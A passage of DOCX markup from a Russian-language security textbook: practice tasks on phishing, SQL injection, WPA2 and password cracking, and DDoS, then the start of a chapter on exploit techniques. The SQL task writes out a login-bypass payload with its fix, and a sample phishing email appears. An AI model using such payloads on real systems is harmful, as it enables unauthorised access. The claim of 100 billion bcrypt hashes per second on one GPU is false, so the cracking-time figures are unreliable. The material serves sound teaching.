      </w:pPr>
      <w:r>
        <w:t>Использование украденных email/password с одного сайта на других. 53% пользователей используют один пароль везде → миллионы аккаунтов скомпрометированы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 1 — Распознавание фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ты получил email:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>От: security@paypa1.com</w:t>
        <w:br/>
        <w:t>Тема: СРОЧНО! Ваш аккаунт заблокирован!</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">Обнаружена подозрительная активность. </w:t>
        <w:br/>
        <w:t>Подтвердите личность в течение 24 часов, иначе аккаунт будет удалён.</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Кликните здесь для подтверждения]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Какие признаки фишинга ты видишь?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подозрительный домен**: `paypa1.com` (единица вместо L) вместо `paypal.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Срочность**: «24 часа, иначе...» (паника)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Страх**: «аккаунт будет удалён»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Общее обращение** (нет имени)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подозрительная ссылка** (наведи мышь → увидишь реальный URL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Действия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не кликай на ссылку</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перейди на paypal.com вручную (набери в браузере)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверь аккаунт там</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сообщи о фишинге: `phishing@paypal.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 2 — SQL-инъекция</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Веб-форма входа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username='$username' AND password='$password'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Какой ввод позволит войти без пароля?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>username: admin' OR '1'='1' --</w:t>
        <w:br/>
        <w:t>password: (любой)</w:t>
        <w:br/>
        <w:br/>
        <w:t>SQL: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`OR '1'='1'` — всегда истина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`--` — комментарий (всё после игнорируется)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат: вход без проверки пароля</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username=? AND password=?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute([$username, $password]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 3 — Взлом WPA2</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>У тебя есть handshake от Wi-Fi сети. Пароль: `MyWiFi2023`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сколько времени займёт взлом, если:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Словарь из 10 млн паролей, скорость проверки 1000 паролей/сек?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Словарь из 1 млрд паролей, скорость 100,000 паролей/сек?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**10 млн паролей, 1000 п/сек:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Время = 10,000,000 / 1000 = 10,000 секунд = 2.8 часа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**1 млрд паролей, 100,000 п/сек:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Время = 1,000,000,000 / 100,000 = 10,000 секунд = 2.8 часа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если пароль `MyWiFi2023` в словаре → взломан за часы. Если пароля нет в словаре → brute force займёт годы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используй длинный пароль (16+ символов): `My-Super-Secure-WiFi-Password-2023!`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 4 — DDoS-атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Твой сайт получает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100,000 запросов/сек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Сервер обрабатывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1000 запросов/сек</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сколько процентов запросов будет обработано?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие методы защиты помогут?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Процент обработанных запросов:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Обработано = 1000 / 100,000 = 1%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   99% запросов отброшены → сайт недоступен</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Методы защиты:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CDN (Cloudflare, Akamai)** — распределит трафик по дата-центрам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rate limiting** — блокировать IP после 100 запросов/сек</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WAF** — фильтровать подозрительные запросы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Anycast** — один IP → несколько серверов по миру</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Увеличение мощности** (вертикальное/горизонтальное масштабирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 5 — Расчёт времени взлома пароля</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">GPU RTX 4090 проверяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 миллиардов хешей/сек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bcrypt).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пароли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`12345678` (8 цифр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`Password1` (9 символов, буквы + цифра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`P@ssw0rd!2023` (13 символов, буквы + цифры + спецсимволы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сколько времени займёт brute force каждого пароля?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Параметры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цифры: 10 символов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буквы (a-z, A-Z): 52 символа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буквы + цифры: 62 символа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буквы + цифры + спецсимволы: 95 символов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: 100 млрд/сек</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**`12345678` (8 цифр):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Комбинаций = 10^8 = 100,000,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Время = 100,000,000 / 100,000,000,000 = 0.001 сек</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мгновенно взломан.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**`Password1` (9 символов, буквы + цифра):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Комбинаций = 62^9 = 1.35 × 10^16</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Время = 1.35 × 10^16 / 10^11 = 135,000 сек = 37.5 часов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Взломан за 1.5 дня.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**`P@ssw0rd!2023` (13 символов, буквы + цифры + спецсимволы):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Комбинаций = 95^13 = 5.9 × 10^25</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Время = 5.9 × 10^25 / 10^11 = 5.9 × 10^14 сек = 18.7 млн лет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практически невзламываем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8 символов = небезопасно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>9 символов = взломают за дни</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>13+ символов = безопасно (пока не изобретут квантовые компьютеры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение: Атака — это искусство находить слабое звено</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Мы разобрали десятки способов атак: от примитивного фишинга до сложнейших supply chain attacks (SolarWinds). Но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>общая идея одна:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&gt; Хакеры не ломают шифрование. Они ломают людей, процессы и слабые места в системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Закон Шнайера</w:t>
      </w:r>
      <w:r>
        <w:t>: *Безопасность — это цепь. Она ломается в самом слабом звене.*</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обучай персонал** — 82% атак начинаются с человеческого фактора</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновляй ПО** — большинство взломов используют известные уязвимости</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Используй MFA** — даже если пароль украден, нужен второй фактор</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруй всё** — данные в покое и в движении</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторь** — SIEM, логи, алерты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервируй** — backup спасёт от ransomware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тестируй** — penetration testing, red team exercises</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 9.06 — Методы реализации угроз (технические детали атак: как работает buffer overflow, ROP, heap spray, format string, race condition и т.д.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связанные главы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**9.03 (Угрозы ИБ)** — классификация угроз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**9.04 (Противодействие)** — защита от атак</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**9.06 (Методы реализации угроз)** — технические детали</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**9.02 (Криптография)** — атаки на шифрование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**8.04 (Протоколы Internet)** — сетевые атаки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.6. Методы реализации угроз</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Как хакеры ломают железо и софт (глубокое погружение в техническую дичь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, дружище, в главе 9.05 мы разобрали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какие атаки бывают</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (фишинг, SQL-инъекция, DDoS, MITM), а в главе 9.04 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как защищаться</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (шифрование, MFA, firewall). Теперь пора нырнуть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в технические детали</w:t>
      </w:r>
      <w:r>
        <w:t>: как именно эксплойты работают на низком уровне, как хакеры обходят защиту и почему твой код на C иногда превращается в дырявый сыр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава для технарей</w:t>
      </w:r>
      <w:r>
        <w:t>, кто хочет понять:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как переполнение буфера позволяет выполнить произвольный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как атаковать CPU через спекулятивное исполнение (Meltdown/Spectre)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как менять биты в памяти **физически** (Rowhammer)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как обойти ASLR, DEP и другие защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как работают 0-day эксплойты и почему они стоят миллионы долларов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с другими главами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.05 (Атаки)** — там обзор, тут — технические детали</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.03 (Угрозы)** и **9.04 (Противодействие)** — связь угроз, атак и защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.02 (Представление данных в памяти)** — понимание стека/кучи критично для buffer overflow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.09 (Представление чисел)** — integer overflow связан с переполнением типов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.01 (Архитектура ЭВМ)** — процессор, память, регистры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.02 (Компиляторы)** — как компилятор создаёт уязвимый код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это важно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>знание технических методов атак</w:t>
